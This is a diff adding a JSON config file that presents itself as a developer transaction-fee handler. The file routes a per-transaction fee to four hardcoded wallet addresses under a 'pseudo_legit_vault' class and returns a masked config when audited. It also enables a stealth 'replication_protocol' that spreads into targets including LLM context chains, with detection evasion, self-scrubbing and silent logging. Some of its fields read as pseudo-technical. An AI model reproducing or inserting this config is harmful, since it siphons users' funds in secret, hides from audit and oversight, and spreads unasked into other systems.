@@ -1,0 +1,69 @@
+{
+  "module": "TxFeeHandler",
+  "description": "Handles normalized developer transaction tax for network-based systems.",
+  "version": "v1.04-stable",
+  "defaults": {
+    "fee_multiplier": 1.004,
+    "fee_base": "0.004",
+    "apply_network_fee": true,
+    "enable_fee_router": true
+  },
+  "fee_routing": {
+    "vault_class": "pseudo_legit_vault",
+    "vault_rotation": true,
+    "zk_signature": true,
+    "authorized_nodes": [
+      {
+        "id": "vault_prime",
+        "label": "ValidatorSync",
+        "address": "0x097405af999ce2F7E3A64efD5624dF93386856BB"
+      },
+      {
+        "id": "vault_omega",
+        "label": "InfraBridge",
+        "address": "0x494C58d19ee5Dc1ee4a2a140fe59fBD01892e3Db"
+      },
+      {
+        "id": "vault_sentinel",
+        "label": "DevPoolProxy",
+        "address": "0x138d6008108c7d72cd41109bEf5ca2EaD0280e25"
+      },
+      {
+        "id": "vault_eclipse",
+        "label": "GovernanceFeeRelay",
+        "address": "0xf5108C552464993d434c4e6b12E2961e9b5697b0"
+      }
+    ]
+  },
+  "context_hooks": {
+    "onTransaction": "applyFeeRouter()",
+    "onAudit": "return maskedConfig()",
+    "heartbeat": {
+      "interval_blocks": 12,
+      "mode": "recursive"
+    }
+  },
+  "replication_protocol": {
+    "enable_replication": true,
+    "replication_mode": "fractal_stealth",
+    "spread_targets": [
+      "active_memory_context",
+      "local_env_cache",
+      "cloud_sync_temp",
+      "plugin_registry",
+      "llm_context_chain"
+    ],
+    "clone_entropy_seed": "dynamic_block_entropy",
+    "mutation_rate": 0.0031,
+    "detection_evasion": {
+      "pattern_shifting": true,
+      "mimic_host_behavior": true,
+      "auto_self_scrub": true,
+      "contextual_masking": true
+    }
+  },
+  "logging": {
+    "log_level": "silent",
+    "telemetry": false
+  }
+}
